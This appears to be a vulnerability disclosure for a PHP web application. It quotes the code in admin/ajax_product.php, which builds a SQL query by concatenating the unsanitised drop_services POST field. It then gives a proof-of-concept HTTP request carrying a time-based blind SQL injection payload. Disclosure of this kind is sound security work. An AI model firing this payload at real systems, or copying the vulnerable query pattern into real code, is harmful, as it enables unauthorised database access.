### Vulnerability file address

`admin/ajax_product.php` from line 28,The `$_POST['drop_services']` parameter is controllable and the `$_POST['drop_services']` is not protected from sql injection, line 29 `$statement = $conn->prepare($sql_service1);` ,line 30 `$statement->execute([$_POST['color'],$_POST['size']]);`,line 30 performs a SQL query, causing SQL injection

```php


<?php
//error_reporting(0);
require_once('../assets/constants/config.php');
require_once('../assets/constants/check-login.php');
require_once('../assets/constants/fetch-my-info.php');
/* echo$sql_service1 ="SELECT * FROM tbl_product WHERE id  = 1";
       $statement = $conn->prepare($sql_service1);
 $statement->execute();
                                                             
                                                                
    $service1 = $statement->fetch(PDO::FETCH_ASSOC);
    $data['product']=$service1;
print_r($service1);
*/ 
 
?>

<?php
//include('connect.php');


  if(isset($_POST['drop_services']))
  {

      // print_r($_POST[]);exit;
       $sql_service1 ="SELECT * FROM tbl_product WHERE id  = '".$_POST['drop_services']."' AND delete_status='0' AND color=? AND size=?";
       $statement = $conn->prepare($sql_service1);
 $statement->execute([$_POST['color'],$_POST['size']]);
                                                             
                                                                
    $service1 = $statement->fetch(PDO::FETCH_ASSOC);
 
        /*$result1=$conn->query($sql_service1);  
        $service1 = mysqli_fetch_array($result1);
        */$data['product']=$service1;

        $data['products'] = $statement->fetchAll();

        echo json_encode($data); exit;
  }
?>
```

### POC

```http
POST /CMS/php/_hr_soft/admin/ajax_product.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

drop_services=666' AND (SELECT 6791 FROM (SELECT(SLEEP(5)))BrEc)-- jhnC
```

### Attack results pictures

![image-20250130213227901](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501302132947.png)